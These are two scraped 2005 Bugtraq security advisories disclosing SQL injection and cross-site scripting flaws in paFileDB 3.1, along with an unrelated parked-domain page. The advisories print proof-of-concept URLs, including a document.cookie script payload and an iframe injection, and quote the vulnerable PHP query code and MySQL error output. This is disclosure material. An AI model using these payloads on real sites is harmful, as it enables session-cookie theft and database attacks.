=== Content from marc.info_b58a6a0e_20250125_215701.html ===

```
[[prev in list](?l=bugtraq&m=111220072101283&w=2)] [[next in list](?l=bugtraq&m=111221890614271&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    PaFileDB Version 3.1 and below are exploitable via a XSS and a
From:       [<dcrab () hackerscenter ! com>](?a=111186454500001&r=1&w=2)
Date:       [2005-03-30 18:08:21](?l=bugtraq&r=1&w=2&b=200503)
Message-ID: [20050330180821.27408.qmail () www ! securityfocus ! com](?i=20050330180821.27408.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=111221940107161&q=mbox) or [body](?l=bugtraq&m=111221940107161&q=raw)]

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Dcrab 's Security Advisory
<http://icis.digitalparadox.org/~dcrab>
<http://www.hackerscenter.com/>

Severity: Medium
Title: PaFileDB Version 3.1 and below are exploitable via a XSS and a SQL injection \
                vulnerability
Date: 31/03/2005

Vendor: PhpArena
Vendor Website: <http://www.phparena.net/pafiledb.php>
Vendor Status: Contacted but no response
Summary: There are, pafiledb version 3.1 and below are exploitable via a xss and a \
sql injection vulnerability.

Proof of Concept Exploits:
<http://localhost/pafiledb/pafiledb.php?action=viewall&id=&start=>'SQL_INJECTION&sortby=name
 SQL INJECTION

paFileDB was unable to successfully run a MySQL query.
MySQL Returned this error: You have an error in your SQL syntax.
Check the manual that corresponds to your MySQL server version for the right syntax \
to use near '\'SQL_INJECTION,20' at line 1 Error number: 1064 The query that caused \
this error was: SELECT * FROM pafiledb_files WHERE file_pin = '0' ORDER BY file_name \
ASC LIMIT \'SQL_INJECTION,20

<http://localhost/pafiledb/pafiledb.php?action=file&id=%22%3E%20%20%3Cscript%3Ealert>(document.cookie)%3C/script%3E
 Pops cookie

Possible Fixes: The usage of htmlspeacialchars(),
mysql_escape_string(), mysql_real_escape_string() and other functions for input \
validation before passing user input to the mysql database, or before echoing data on \
the screen, would solve these problems.

Author:
These vulnerabilties have been found and released by Diabolic Crab, Email: \
dcrab[AT|NOSPAM]hackerscenter[DOT|NOSPAM]com, please feel free to contact me \
regarding these vulnerabilities. You can find me at, <http://www.hackerscenter.com> or \
<http://icis.digitalparadox.org/~dcrab>. Lookout for my soon to come out book on Secure \
coding with php.

-----BEGIN PGP SIGNATURE-----
Version: PGP 8.1 - not licensed for commercial use: [www.pgp.com](http://www.pgp.com)

iQA/AwUBQkrruiZV5e8av/DUEQKjAACgxmr6hi6uMixKXaoioJ15SeyTEOgAoPr1
5+ZEj6cpzBEP0yAuv1tHlKyV
=iwFo
-----END PGP SIGNATURE-----

[[prev in list](?l=bugtraq&m=111220072101283&w=2)] [[next in list](?l=bugtraq&m=111221890614271&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from digitalparadox.org_30452aeb_20250125_215700.html ===

# digitalparadox.org

[Renew Now](https://www.name.com/domain/renew/digitalparadox.org?utm_source=Sedo_parked_page&utm_medium=button&utm_campaign=Sedo_Expired_v)

This webpage was generated by the domain owner using [Sedo Domain Parking](https://www.sedo.com/services/parking.php3). Disclaimer: Sedo maintains no relationship with third party advertisers. Reference to any specific service or trade mark is not controlled by Sedo nor does it constitute or imply its association, endorsement or recommendation.

Privacy Policy

=== Content from marc.info_0e081117_20250125_215701.html ===

```
[[prev in list](?l=bugtraq&m=111066293914977&w=2)] [[next in list](?l=bugtraq&m=111067121410970&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [SECURITYREASON.COM]  SQL injection and XSS in paFileDB
From:       [SecurityReason <sp3x () securityreason ! com>](?a=111065819200001&r=1&w=2)
Date:       [2005-03-12 18:24:42](?l=bugtraq&r=1&w=2&b=200503)
Message-ID: [20050312182442.22116.qmail () www ! securityfocus ! com](?i=20050312182442.22116.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=111065796525043&q=mbox) or [body](?l=bugtraq&m=111065796525043&q=raw)]

-=[ SecurityReason-2005-SRA#03 ]=-

-=[ SQL injection and XSS in paFileDB ]=-

Author: sp3x
Date: 12 March 2005

Affected software :
===================
paFileDB version : =>3.1

Description :
=============

paFileDB is designed to allow webmasters have a database of files for download on \
their site.  To add a download, all you do is upload the file using FTP or whatever \
method you use, log into paFileDB's admin center, and fill out a form to add a file. \
paFileDB lets you edit and delete the files too.
No more messing with a bunch of HTML pages for a file database on your site!
Using speedy MySQL for storing data, and powerful PHP for processing everything, \
paFileDB is one of the best and easiest ways to manage files!

SQL injection:
=======================

/includes/viewall.php
/includes/category.php

Code:
-------------------------------------------------------------------------------------------------
 if ($sortby == "name") {
        $result = $pafiledb_sql->query($db, "SELECT * FROM $db[prefix]_files WHERE \
file_pin = '0' ORDER BY file_name

ASC LIMIT $start,20", 0);
}
if ($sortby == "date") {
        $result = $pafiledb_sql->query($db, "SELECT * FROM $db[prefix]_files WHERE \
file_pin = '0' ORDER BY file_time

DESC LIMIT $start,20", 0);
}
if ($sortby == "downloads") {
        $result = $pafiledb_sql->query($db, "SELECT * FROM $db[prefix]_files WHERE \
file_pin = '0' ORDER BY file_dls

DESC LIMIT $start,20", 0);
}
if ($sortby == "rating") {
        $result = $pafiledb_sql->query($db, "SELECT * FROM $db[prefix]_files WHERE \
file_pin = '0' ORDER BY

(file_rating/file_totalvotes - 1) DESC LIMIT $start,20", 0);
}
--------------------------------------------------------------------------------------------------

As we can see the $start variable is vuln for sql injection attack.
But this sql injection for now is not critical , why ? because if we want to inject \
malicious code to sql sentence

after "ORDER BY" or after "LIMIT", then in current MySql versions, all we can do, is \
to fail the sql request. No

UNION-s etc. When we try to inject sql sentence we get : "Wrong usage of UNION and \
ORDER BY Error number: 1221" so we

must wait When Mysql version 4.1 will be widely used then we can have something like \
this - "ORDER BY desc ASC LIMIT

(SELECT our_table FROM pafiledb_admin)...".

Examples:
=========

Sql injection:
--------------
http://[target]/[pafiledb_dir]/pafiledb.php?action=viewall&start='&sortby=rating
http://[target]/[pafiledb_dir]/pafiledb.php?action=category&start='&sortby=rating

error message :
---------------
paFileDB was unable to successfully run a MySQL query.
MySQL Returned this error: You have an error in your SQL syntax near '\',20' at line \
1 Error number: 1064 The query that caused this error was: SELECT * FROM \
pafiledb_files WHERE file_pin = '0' ORDER BY

(file_rating/file_totalvotes - 1) DESC LIMIT \',20

Also in this error message we can see the [prefix] pafiledb tables that should be \
hidden :)  And we can insert XSS code in error message for example :

Cros Site Scripting (XSS):
--------------------------

http://[target]/[pafiledb_dir]/pafiledb.php?action=viewall&start="><iframe%20src=<http://www.securityreason.com>></iframe

> &sortby=rating
http://[target]/[pafiledb_dir]/pafiledb.php?action=category&start="><iframe%20src=<http://www.securityreason.com>></ifram

e>&sortby=date

error message :
---------------
paFileDB was unable to successfully run a MySQL query.
MySQL Returned this error: You have an error in your SQL syntax near '[Our XSS]',20' \
at line 1 Error number: 1064 The query that caused this error was: SELECT * FROM \
pafiledb_files WHERE file_pin = '0' ORDER BY

(file_rating/file_totalvotes - 1) DESC LIMIT [Our XSS]',20

How to fix :
============

Download the new version of the script or update.

Vendor :
========

No respond

Greetz :
========

Special greetz : cXIb8O3 , pkw :]

Contact :
=========

sp3x[at]securityreason[dot].com
[www.securityreason.com](http://www.securityreason.com)

[[prev in list](?l=bugtraq&m=111066293914977&w=2)] [[next in list](?l=bugtraq&m=111067121410970&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


